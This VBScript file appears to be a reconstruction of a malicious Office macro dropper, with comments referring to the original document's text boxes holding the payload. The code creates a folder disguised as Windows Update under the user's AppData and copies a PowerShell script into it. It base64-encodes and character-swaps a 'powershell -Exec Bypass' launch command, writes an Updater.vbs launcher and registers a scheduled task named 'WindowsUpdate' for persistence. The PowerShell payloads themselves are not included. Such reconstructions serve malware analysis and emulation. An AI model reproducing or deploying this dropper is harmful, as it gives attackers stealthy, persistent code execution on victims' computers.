Function Base64Encode(inData)
  'This was taken because it's not native to vbs. srcRef: https://www.motobit.com/tips/detpg_Base64Encode/
  'rfc1521
  '2001 Antonin Foller, Motobit Software, http://Motobit.cz
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim cOut, sOut, I
  
  'For each group of 3 bytes
  For I = 1 To Len(inData) Step 3
    Dim nGroup, pOut, sGroup
    
    'Create one long from this 3 bytes.
    nGroup = &H10000 * Asc(Mid(inData, I, 1)) + _
      &H100 * MyASC(Mid(inData, I + 1, 1)) + MyASC(Mid(inData, I + 2, 1))
    
    'Oct splits the long To 8 groups with 3 bits
    nGroup = Oct(nGroup)
    
    'Add leading zeros
    nGroup = String(8 - Len(nGroup), "0") & nGroup
    
    'Convert To base64
    pOut = Mid(Base64, CLng("&o" & Mid(nGroup, 1, 2)) + 1, 1) + _
      Mid(Base64, CLng("&o" & Mid(nGroup, 3, 2)) + 1, 1) + _
      Mid(Base64, CLng("&o" & Mid(nGroup, 5, 2)) + 1, 1) + _
      Mid(Base64, CLng("&o" & Mid(nGroup, 7, 2)) + 1, 1)
    
    'Add the part To OutPut string
    sOut = sOut + pOut
    
    'Add a new line For Each 76 chars In dest (76*3/4 = 57)
    'If (I + 2) Mod 57 = 0 Then sOut = sOut + vbCrLf
  Next
  Select Case Len(inData) Mod 3
    Case 1: '8 bit final
      sOut = Left(sOut, Len(sOut) - 2) + "=="
    Case 2: '16 bit final
      sOut = Left(sOut, Len(sOut) - 1) + "="
  End Select
  Base64Encode = sOut
End Function

Function MyASC(OneChar)
  If OneChar = "" Then MyASC = 0 Else MyASC = Asc(OneChar)
End Function



Dim Script,inp

'They call environ() here instead. 

Set wshShell = CreateObject("WScript.Shell")
strName = wshShell.ExpandEnvironmentStrings("%USERNAME%")
Set fso = CreateObject("Scripting.FileSystemObject")

Paath = "C:\Users\" & strName & "\AppData\Local\Microsoft\Windows\Update\"

'Below are commented out. There's also XML packed in the doc, which is used to build the actual ps1 files which are not included in this doc. I'm going to just put what's there for this part.
'inp = Google.map.Txt

inp="powershell.exe -Exec Bypass PATHScript.ps1"
If (NOT fso.FolderExists(Paath)) Then
  fso.CreateFolder(Paath)
End If

Set xmlfile = fso.OpenTextFile("sktask.txt")
XML=xmlfile.ReadAll()
xmlfile.close()
Set xmlfile = Nothing

Set FSO1 = CreateObject("Scripting.FileSystemObject")
f2movedst= Paath & "Script1.ps1"
fso.CopyFile "Script1.ps1",f2movedst


    'The following is already in this folder unobfuscated.  Need the actual XML to get content, which I will not provide. Instead i'm going to just move the file as above.
'Set FS1 = FSO1.CreateTextFile(Pathh & "Script.ps1", True)
    'Textbox19 is within the DOCM and contains the malicious text. The following writes Script1.ps1 to the document.
'ActiveDocument.Shapes.Range(Array("Text Box 19")).Select 
'Selection.WholeStory 
'FS1.WriteLine Selection.Text
'FS1.Close 
'Create Temp1.ps1 (same method)
'Set FSO3 = CreateObject("Scripting.FileSystemObject")
'Set FS3 = FSO3.CreateTextFile(Pathh & "temp.ps1", True)
    'This is where the malicious script is stored Textbox18
'ActiveDocument.Shapes.Range(Array("Text Box 18")).Select 
'Selection.WholeStory 
'FS3.WriteLine Selection.Text
'FS3.Close   
   'Add exec bypass to script for later use. Executes Script1.ps1

 inp = Replace(inp, "PATH", Paath)
 inp = Base64Encode(inp)


'Obfuscate the x64psExec
inp = Replace(inp, "a", "@")
inp = Replace(inp, "H", "-")
inp = Replace(inp, "S", "$")
'Added this part because we're not fiddlin with the doc's XML, but we need this to launch the schtask.
XML = Replace(XML, "C:thepath", Paath)
VBS = "xxx = """ & inp & """" & vbNewLine & pla

'Create the script to launch the malicious code which will be added to schtasks later.

Set FSO2 = CreateObject("Scripting.FileSystemObject")
Set FS2 = FSO2.CreateTextFile(Paath & "Updater.vbs", True)
FS2.WriteLine VBS
FS2.Close 

Set service = CreateObject("Schedule.Service")
Call service.Connect()
Set rootFolder = service.GetFolder("\")
  'Schedules a "wscript powershell.exe -Exec Bypass C:\Users\%User%\Microsoft\Update\Script1.ps1
temp = rootFolder.RegisterTask("WindowsUpdate", XML, 6,  ,  , 3)

